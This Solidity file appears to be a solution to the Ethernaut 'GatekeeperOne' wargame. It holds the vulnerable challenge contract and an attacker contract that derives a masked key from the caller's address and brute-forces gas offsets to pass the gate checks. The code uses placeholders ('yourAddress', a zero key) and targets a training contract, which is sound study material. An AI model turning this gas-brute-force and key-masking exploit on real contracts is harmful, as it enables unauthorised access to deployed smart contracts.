// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol";

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract AreYouTheKeymaster{
    using SafeMath for uint256;
    bytes8 txOrigin16 = 0x0; //last 16 digits of your account
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
    //Where yourAddress is the targeted address instance you get from Ethernaut
    GatekeeperOne public gkpOne = GatekeeperOne(yourAddress);

    
    function letMeIn() public{
         for (uint256 i = 0; i < 500; i++) {
         (bool result, bytes memory data) = address(gkpOne).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
      if(result)
        {
        break;
            }
         }
    }
}